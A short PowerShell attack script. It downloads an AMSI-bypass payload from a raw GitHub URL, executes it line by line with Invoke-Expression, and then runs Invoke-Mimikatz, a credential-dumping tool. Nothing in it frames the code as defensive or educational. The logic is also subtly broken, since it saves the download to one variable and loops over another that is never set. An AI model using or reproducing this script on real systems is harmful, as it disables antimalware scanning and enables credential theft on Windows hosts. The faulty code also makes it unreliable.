
#grab the AMSI bypass code from github
$block = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/patch1.ps1")

# Split into lines and execute each one in current session
$scriptText -split "`r?`n" | ForEach-Object {
    if (-not [string]::IsNullOrWhiteSpace($_)) {
        Invoke-Expression $_
    }
}

#test the AMSI bypass
Invoke-Mimikatz

